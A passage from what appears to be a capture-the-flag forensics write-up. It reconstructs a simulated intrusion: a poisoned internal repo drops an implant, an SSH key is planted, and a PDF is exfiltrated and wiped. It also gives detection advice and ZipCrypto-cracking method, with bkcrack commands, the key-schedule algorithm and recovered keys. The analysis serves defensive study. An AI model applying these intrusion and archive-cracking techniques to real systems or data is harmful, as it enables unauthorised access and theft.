The filename names the source (Clara Voss), the credential names the target (Tom Ainsworth), and the room's own scenario text says the investigation moved from Voss to Ainsworth. **This is the collection phase's product being consumed by the intrusion phase, recorded in both rooms' artifacts.** It is stronger than the Silvertown link and stronger than the DIOGENES programme-name link, both of which the MOC currently lists as the only evidence-level joins.

> [!warning] Case discrepancy, unresolved
> Paper Ghost records `D10g3n3s_T1ck3ts#2026` (capital D); this room's `cvoss_exfil` reads `d10g3n3s_T1ck3ts#2026` (lowercase d). One of the two notes has a transcription error, or the author varied it. **Not resolved here** — the Paper Ghost artifact was not re-read. See §17.

Secondary link: Tom's contractor identifier on the roster export is **`EXT-0419`**. Paper Ghost's fabricated contractor Elias Venn is **`EXT-0431`**. Same scheme, twelve apart. [Inference] — the numbering suggests the fake ID was minted against a real series, but nothing in either room proves the two were issued by the same system.

---

## 9. Timeline — whole operation

| When | What | Evidence |
|---|---|---|
| 2026-09-11 15:58:56 +0100 | `diogenes-breakroom-roster` pushed (benign decoy) | git commit `12f40ad` |
| 2026-09-11 16:05:06 +0100 | `diogenes-ticket-parser` pushed (malicious) | git commit `81d8e74` |
| 2026-09-11 19:34:35Z | Roster PDF generated by Tom | PDF `CreationDate` |
| 2026-09-13 17:54–17:56 | Decoy `~/.cache` subdirectories created | audit 09-13 |
| 2026-09-13 18:45:38 | `LOOT.zip` last-modified stamp | zip central directory |
| 2026-09-15 15:19:59 | Tom clones the poisoned repo | audit event 354 |
| 2026-09-15 15:20:20 | `python3 ticket_parser.py` | audit event 361 |
| 2026-09-15 15:20:21 | Implant written, chmod'd, executed; callback to `203.0.113.10:31337` | audit 362–364 |
| 2026-09-15 15:23:38 | First operator shell | audit event 365 |
| 2026-09-15 15:26:40 | SSH key fetch attempt by hostname — fails, no DNS | audit event 366 |
| 2026-09-15 15:34:50 | SSH key fetch by IP — succeeds | audit event 369 |
| 2026-09-15 15:37:59 | `search -f *.pdf` → EACCES | `framework.log` |
| 2026-09-15 15:38:41 | `cd ../ONBOARDING` → ENOENT | `framework.log` |
| 2026-09-15 ~15:39 | `search -d ONBOARDING -f *.pdf`, then `download` | `meterpreter_history` |
| 2026-09-15 15:40:57 | Roster PDF deleted from Tom's host | audit event 381 |
| 2026-09-15 15:53:50 | UAC acquisition begins | UAC banner |

**The `LOOT.zip` stamp of 2026-09-13 predates the 2026-09-15 exfiltration by two days.** That is an authoring artifact, not tradecraft — see §17.

---

## 10. Tools & techniques

`python3` · `git` · `unzip` / `7z` · `zip2john` / `john` · **`bkcrack` 1.7.1** · `ffuf` · `curl` · `openvpn` · `readelf` / `nm` / `file` / `strings` · `pdfplumber` / `pypdf`

**Concepts:** reading a payload out of a git pack when the working tree is incomplete · duplicate-author decoy discrimination · repeating-XOR payload carriage with a bundled media key · base64-assembled path construction as a `strings` defeat · Mettle identification by DWARF compile-unit path · **auditd hex-encoded EXECVE argument decoding** · execve-only audit rule as the sole execution record · reparent-to-init as a consequence of `&` backgrounding · Meterpreter vs msfconsole separate readline histories · `framework.log` errno records as answer disambiguation · `pathlib` absolute-path absorption in a Flask `send_file` handler · **500-vs-404 as a file-existence oracle** · `cmplen` minus 12 as the ZipCrypto compressed-length check · CRC32 pre-verification of known plaintext · Biham–Kocher ZipCrypto key recovery · **ZipCrypto key-schedule derivation as a password oracle** (candidate → three 32-bit words, compared directly against the recovered keys)

---

## 11. MITRE ATT&CK

| Technique | ID | Evidence |
|---|---|---|
| Supply Chain Compromise: Compromise Software Dependencies and Development Tools | T1195.001 | poisoned repo on the internal forge, cloned by a developer |
| User Execution: Malicious File | T1204.002 | `python3 ticket_parser.py` |
| Obfuscated Files or Information | T1027 | repeating-XOR payload in `calibration.bin`, base64 path components |
| Deobfuscate/Decode Files or Information | T1140 | `validate_environment()` reconstructing the ELF at runtime |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | `/bin/sh -c`, four operator shells under the implant |
| Non-Standard Port | T1571 | TCP 31337 callback |
| Ingress Tool Transfer | T1105 | `wget` of the operator's own public key from port 9999 |
| Account Manipulation: SSH Authorized Keys | T1098.004 | `-O authorized_keys` in `/home/Tom/.ssh` |
| File and Directory Discovery | T1083 | `search -d ONBOARDING -f *.pdf` |
| Data from Local System | T1005 | `download Gov_HR_…_Roster.pdf` |
| Archive Collected Data: Archive via Utility | T1560.001 | password-protected `LOOT.zip` |
| Exfiltration Over C2 Channel | T1041 | Meterpreter `download` over the 31337 session |
| Indicator Removal: File Deletion | T1070.004 | `rm Gov_HR_…_Roster.pdf` |
| Indicator Removal: Clear Command History | T1070.003 | `cat /dev/null > ~/.bash_history` on the operator's own host |
| Develop Capabilities: Malware | T1587.001 | `msfvenom` and the XOR packer in `/home/moran/Tools` |

> [!warning] Honest scope
> IDs assigned without access to the live ATT&CK matrix; treat as a mapping proposal, not a verified one.
>
> **T1195.001 is the closest slot but is a stretch.** The sub-technique describes compromise of a dependency or build tool in a distribution channel. Here the repository itself is attacker-authored and pushed to a forge the victim trusts — closer to a watering-hole with a git remote than to a dependency-confusion or build-system compromise. There is no ATT&CK technique for "attacker publishes a plausible internal tool on the org's own forge".
>
> **T1070.003 is on the wrong host.** The history wipe is the operator clearing their *own* shell history on the C2 box, not defensive evasion on the victim. It is listed because it is real, recorded behaviour, but it does not describe an action against DIOGENES.
>
> **No technique covers the XOR-with-a-bundled-JPEG carriage specifically.** T1027 captures the obfuscation, T1140 the runtime decode; neither captures that the key and the ciphertext ship in the same commit.

---

## 12. Detection / blue-team notes

**On the repository, before anything executes.** This is the cheapest place to stop it and every signal is static:

- **A Python package whose import graph reaches `subprocess.run(..., shell=True)` from module import or `main()`.** `telemetry.py` is forty lines and one of them is a shell call. A single grep for `shell=True` across a newly cloned internal repo catches it.
- **Binary blobs in a text-processing package.** A CSV-to-JSON parser has no business shipping 1.1 MB of `calibration.bin`. Size-versus-purpose mismatch in a dependency is a first-class signal.
- **Base64 string constants assembled into filesystem paths.** `LmNhY2hl` / `LnRpY2tldC1wYXJzZXI=` / `LmludGVncml0eQ==` exist purely to keep `.cache/.ticket-parser/.integrity` out of `strings` output. Any base64 literal in source that decodes to a path or a command is malicious until proven otherwise.
- **A forge repository with exactly one commit, authored by an identity with no other history.** Both internal repos here have one commit and one author. A forge that shows contributor history makes this trivially visible.
- **`.DS_Store` in a repository attributed to an internal Linux team.** Minor, but it is inconsistent with the claimed provenance.

**On the host.**

- **A dotfile executable under `~/.cache`.** Nothing legitimate writes an executable ELF into a cache directory with a leading-dot name. `find ~ -path '*/.cache/*' -type f -perm -u+x -exec file {} +` is a one-line hunt and it finds this immediately.
- **A process whose ppid is 1 and whose executable lives under a user's home.** The `&` reparenting that hides the origin also produces a signature: init-parented, user-owned, non-service binary.
- **An outbound connection on a memorable high port from a user process.** 31337 is stock msfvenom laziness. `ss -tanp` with the process column shows `.integrity` holding the socket.
- **`auditd` with an execve rule on interactive uids is what made this room solvable.** One `-a always,exit -F arch=b64 -S execve,execveat -F uid=<n> -F key=<name>` rule survived a shell that kept no history and an implant that spawned `/bin/sh` four times. **It is the single highest-value Linux logging change available**, and it cost 189 records over four days on this host.
- **Use `ausearch -i`, or decode the hex yourself.** An analyst grepping raw `audit.log` for `wget` on this host sees a command with no URL. The two flags that open the rest of the intrusion are in hex fields.

**On the operator's infrastructure, at the class level.** The exfil archive was protected with **ZipCrypto**, and a note describing the procedure was left in the same directory as the archive and inside it. Any responder who recovers both has the contents, permanently, without the password. Stated generally: **legacy ZIP encryption plus any recoverable member is equivalent to no encryption.** The same failure mode applies to AES-encrypted archives only if the key is recoverable; ZipCrypto needs no key at all, just twelve known bytes.

**And the password was strong.** It survived rockyou, an exhaustive printable search to twelve characters, and 184,877 targeted combinations (§17.3). It bought nothing. **Password strength is irrelevant to a cipher with a known-plaintext break** — the control that would have mattered is choosing AES-256 in the archive tool, or simply not leaving a copy of an archive member unencrypted beside it. This is worth stating to any team whose data-handling policy specifies "password-protected zip" without specifying the encryption method, because the default in `zip(1)` is still ZipCrypto.

---

## 13. Method notes

- **Decode auditd's hex arguments before reading the log.** Four of this room's fifteen flags sit in two EXECVE records, and two of the four are invisible to substring search. `ausearch -i` if the tooling is present; a `bytes.fromhex()` branch in the parser if not. **This is the Linux-triage equivalent of the MOC's §3.5 rule** — a transformed container defeats `grep`, and here the transform is applied per-argument inside an otherwise plaintext file.
- **When two artifacts answer one question with near-identical strings, the malicious object's rendering is the answer.** Flag 2's two Moran identities differ by one letter's case and one letter's order. The benign repo exists to supply the wrong one.
- **The question's verb selects between two true answers.** Flag 11: `msfvenom -p linux/x64/...` and `set payload linux/x64/...` both declare x64. "While preparing the **listener**" selects the handler block. Cousin of MOC §3.8, but the discriminator here is the question's wording rather than the artifact's plausibility.
- **The operator's failures disambiguate their successes.** Three `search` invocations, two of which error in `framework.log` with EACCES and ENOENT. The surviving one is the answer. Borrowed Name found the same thing with its `/targer:` typo run; that makes two rooms.
- **Verify known plaintext by CRC32 before running a known-plaintext attack.** One `zlib.crc32()` call turned a ten-minute gamble into a certainty, and it would have caught a trailing-newline error instantly. **Do this whenever the target format stores a checksum** — ZIP, PNG, gzip and most container formats do.
- **Read the length arithmetic before matching compression settings.** `cmplen` 88 for 83 decompressed bytes looks like deflate *expanding* the data, which would have sent me hunting for a stored-block producer. Subtracting ZipCrypto's 12-byte header gives 76, which is what every deflate level produces. **A five-second check prevented a wrong hypothesis about how the archive was built.**
- **Once you hold ZipCrypto's internal keys, test password candidates against the key schedule, not against the archive.** The three 32-bit words are a deterministic function of the password alone — `k0=0x12345678, k1=0x23456789, k2=0x34567890`, then per byte `k0=crc32_1(k0,c)`, `k1=(k1+(k0&0xff))*134775813+1`, `k2=crc32_1(k2,k1>>24)`. Comparing the final triple is an exact test with no trial decryption, no CRC check and no false positives, and it runs in about twenty lines of Python. **Validate the implementation against a zip you made with a known password before trusting a negative result** — a silent bug here reads identically to "not in the list."
- **Wordlist class must match target class.** ~68,000 requests from `raft-*-files.txt` produced one hit, and that hit was the only web-shaped filename in the directory. Operator-chosen document names are not in web-content wordlists. **Build the list from the room's own nouns** — every proper name, programme name and directory name already recovered.
- **Enumerate case variants explicitly, including all-caps.** `loot` and `Loot` were tried; `LOOT` was the answer. This extends the event's §3.1 rule from *submission* to *discovery*: the operator's capitalisation is data on both sides of the flag box.
- **On an unguarded file handler, 500 and 404 mean different things.** 500 is "exists, unreadable" and is a free existence oracle. 404 conflates "absent" with "is a directory". Knowing which is which changes what a null result tells you.
- **Export shell variables before backgrounding jobs, and sanity-check them with one cheap request.** Two ffuf runs were lost to an unset `$C` in a fresh shell; the tool reported a header parse error rather than an auth failure, which is easy to misread as a syntax problem. A single `curl` against a known-good path before a long run costs one second.

---

## 14. Blind alleys — eliminated, do not re-walk

- **`runtime_checks.py` and `output_helpers.py`.** Eighty lines of functioning, benign Python that can never execute — every call into them raises before doing work, and a bare `except: pass` hides it. Reading them for the payload is wasted time; they exist to make `main()` look busy.
- **`rockyou.txt` against `LOOT.zip`.** 14.3M candidates at 259k/s, zero hits. The archive is ZipCrypto and the known plaintext was sitting unencrypted in the same directory the whole time. **Check the encryption type before starting any wordlist run** — `bkcrack -L` or `zip2john`'s output both tell you.
- **Recovering the `LOOT.zip` password from the internal keys.** `bkcrack -r 12 '?p'` (ten minutes, all printable to length 12), 35 vocabulary candidates, 184,877 two-token combinations, and `rockyou.txt` all missed. See §17.3. **The keys are the deliverable; the password is a curiosity** — and once the keys are in hand there is no analytical question the password answers.
- **`raft-small-files.txt` / `raft-medium-files.txt` against `Exfiltrated_Loot/`.** Wrong wordlist class. ~68k requests, one hit, and the hit was already known.
- **Probing for subdirectories under `Exfiltrated_Loot/`.** `is_file()` returns False for directories, so a directory is indistinguishable from a nonexistent path. There is no way to enumerate structure through this endpoint.
- **`.viminfo`, `.python_history`, `.lesshst`, `.zsh_history`, `recently-used.xbel`, `nano/filepos_history` on the operator's home.** All 404. The operator used `nano` twice per their bash history, but no nano state files exist.
- **`/var/log/syslog`, `/root/.bash_history`.** 404 and 500 respectively. The Flask process runs as `moran`; nothing privileged is reachable.
- **Carving the deleted PDF from Tom's host.** UAC is a live-response collector — it copies files, it does not image free space. The `bodyfile.txt` has no entry for the deleted roster. The only copy is in `LOOT.zip`.
- **Searching the local evidence for the exfil archive name.** Grepped `bodyfile.txt` and every `live_response/` file for `.zip` / `.7z` / `.tar.gz`. Two hits: `/root/Tom.zip` (the examiner's own collection) and a `.7z` test fixture inside the `dlt` repo. Flag 13 is not answerable offline.
- **The benign `diogenes-breakroom-roster` repo.** Runs clean (`python3 roster.py` at 15:19:20, no child processes). Its only function in the room is to supply flag 2's decoy author string.

---

## 15. Wrong submissions

**None.** Fifteen flags, fifteen first-attempt accepts.

Recorded because it is the first clean room in the event and the reason is identifiable: every answer was checked against the artifact's literal rendering *before* submission rather than after a rejection, and the two near-miss traps — flag 2's duplicate author and flag 7's paste-artifact suffix — were both caught by reading the raw bytes rather than a tool's summary.

Running event total stays at **thirteen wrong submissions**, eleven of which were format-not-content (MOC §4.1).

---

## 16. What the room teaches that the others did not

1. **Linux triage has a single highest-value artifact and it is the audit log.** Bottle Out and Paper Ghost were Windows rooms where execution evidence was spread across Prefetch, BAM, SRUM, UserAssist and EVTX. Here one `auditd` rule replaced all of it — and a shell history wipe, a non-interactive implant shell, and four separate `/bin/sh` spawns were all still fully reconstructible.
2. **A live host is an evidence source with an expiry.** Five of fifteen flags were unreachable from the download. The offline work should be sequenced *after* the perishable work, not before. [Inference] — this ordering was not followed here and it cost nothing only because the box stayed up.
3. **Known plaintext is a form of key leakage.** The event's §3.3 rule has been about keys and descriptions. This room adds: **a readable copy of any encrypted member is equivalent to the key** for legacy ZIP. The operator's own README was the leak.
4. **Discovery is subject to the same literalness as submission.** §3.1 has been a rule about what you type into the flag box. `LOOT.zip` extends it to what you type into a wordlist.

---

## 17. Open items

1. **`solves` omitted** — not read off the platform. Consistent with the five sibling notes.
2. **`category: forensics` unverified** — inherited from the siblings, not read off the Holmes page. `difficulty: medium` and `points: 1000` *are* verified, from the challenge page text captured in the scenario block.
3. **The `LOOT.zip` password was not recovered and is out of reach.** `bkcrack -k 85b6bbc1 27824945 ce665bee -r 12 '?p'` exhausted every printable ASCII password to length 12 in ten minutes with no hit. Direct key-schedule tests against 35 vocabulary candidates and 184,877 two-token combinations of the room's proper nouns also missed, as did `rockyou.txt` via `zip2john`. **[Inference]** the password is ≥13 characters and is not built from the room's vocabulary — **the one place in this room where the operator's credential hygiene holds**, against a static `napoleon_moran_1894` web cookie and a reused `moran`/`1894` naming scheme everywhere else. Not needed for any flag; the recovered keys are strictly more capable than the password, since they also permit `bkcrack -U` to re-password the archive.
4. **`d10g3n3s` vs `D10g3n3s` — unresolved case discrepancy** between this room's `cvoss_exfil` and the credential recorded in the Paper Ghost note. One of the two is a transcription error. **Re-read the Paper Ghost artifact before either note is cited for the credential.**
5. **`/home/Tom/.ssh/authorized_keys` has an mtime of 2026-09-10 17:18**, five days *before* the `wget` that allegedly wrote it (2026-09-15 15:34:50). The key it contains is `ssh-rsa … moran@BlackPearl`. Either the key was planted by other means and the `wget` is theatre, or the timestamp is an authoring artifact of how the evidence was built. **[Unverified]** — no artifact distinguishes these.
6. **`LOOT.zip`'s central-directory timestamp is 2026-09-13 18:45:38**, two days before the roster was exfiltrated on 2026-09-15. Same class of problem as item 5.
7. **`/home/moran/repos/` and the deleted `toss/` were never enumerated.** Both appear in the operator's surviving bash history. `repos/` plausibly holds the pre-push copies of both internal repositories, which would date the poisoning independently of the git commit stamps.
8. **`/home/moran/Tools/reverse.bin` was not downloaded and hashed** against the implant reconstructed from Tom's repository. Attempted at 07:40 on 2026-09-20; the instance had already been released (`Destination Host Unreachable` from the VPN gateway, tunnel healthy), so this is now closable only by respawning the box on a new IP. **[Inference]** the build chain is already established from both ends — `create_cal_bin.py` is `telemetry.py`'s XOR function run in reverse, and the reconstruction from Tom's repo matches the on-disk implant at `25b91344afc4d1ed01e2bd9d3c23e2cd` — so the hash would be a third confirmation of a fact two artifacts already carry, not new evidence.
9. **`203.0.113.10` vs `BlackPearl2026.htb` vs `10.129.4.236`.** The first is TEST-NET-3 documentation space, the second is the name the operator used, the third is the spawned instance. Whether the challenge intends `203.0.113.10` to *be* BlackPearl2026.htb is implied but never stated in an artifact.
10. **The `felamos` git identity** on every one of Tom's repositories is a challenge-authoring artifact (an HTB handle), not part of the scenario. Noted so a future reader does not chase it as an actor name.

---

## Cross-references

- [[00_MOC-HTB-Holmes2026-Reichenbach-Directive-Event]] — event index; this room supplies §3.3's fifth instance and its first *cryptographic* one, and extends §3.1 from submission to discovery
- [[HTB-Holmes2026-Paper-Ghost-Planted-USB-Spyware-Search-Index-Recovery]] — Sherlock 04; **`cvoss_exfil` is the evidence-level join**, and `EXT-0419`/`EXT-0431` the secondary one
- [[HTB-Holmes2026-Borrowed-Name-AdaptixC2-RC4-Profile-Key-ResetNightmare]] — Sherlock 08; `afenwick` and `jreed` both appear on this room's roster with their real directorates
- [[HTB-Holmes2026-Silent-Dividend-Electron-Preload-Dropper-Onchain-Key-Oracle]] — Sherlock 01; same "the thing that unlocks it ships alongside" structure
- [[HTB-Holmes2026-Bottle-Out-Wiped-Laptop-Gajim-XMPP-TacticalRMM]] — Sherlock 02; origin of the answer-format-is-literal rule that flag 2 re-proved
- [[HTB-Holmes2026-Iron-Feather-PX4-Encrypted-Dataman-ULog-Custom-KDF]] — Sherlock 07; same reimplement-the-transform approach applied here to the XOR carrier
- [[00_ctf-writeup-standard]] — structure this note conforms to
- [[HTB]]

---

## Change Log

- 2026-09-20 — Note created. All fifteen flags solved and recorded; scenario captured verbatim. **Zero wrong submissions — first clean room in the event**, recorded in §15 with the reason. `difficulty` and `points` read off the challenge page; `category` and `solves` marked unverified (§17.1–2). Ten open items in §17, of which items 5 and 6 are timestamp inconsistencies that may be authoring artifacts rather than findings, and item 4 is a live discrepancy against the Paper Ghost note requiring a re-read before either is cited. MITRE table flagged in §11 as a mapping proposal with three named weaknesses (T1195.001 scope, T1070.003 host, no technique for the XOR carrier). `type: writeup` and `status: complete` need checking against `Governance/02_frontmatter-standard.md` before filing.
- 2026-09-20 — Post-solve update after the `LOOT.zip` password recovery was attempted and **failed**. §17.3 rewritten from "not run" to a finding: password ≥13 characters, not vocabulary-derived, the one place the operator's credential hygiene holds. §12 gains a paragraph on password strength being irrelevant against a known-plaintext break, with the `zip(1)` ZipCrypto-default point for policy language. §13 gains the key-schedule-as-oracle technique and the validate-before-trusting-a-negative caveat. §14 gains the recovery attempt as an eliminated path. §10 gains the derivation to the concept list. §6.2 cross-referenced to §17.3. **No flag answers changed.**
- 2026-09-20 — §17.8 updated: the `Tools/` hash comparison was attempted at 07:40 and the instance had already been released (`Destination Host Unreachable` from the VPN gateway, tunnel healthy), so the item is now closable only by respawn. Reworded from "never downloaded" to record the attempt and why the missing hash does not weaken the build-chain conclusion. **No flag answers changed.**
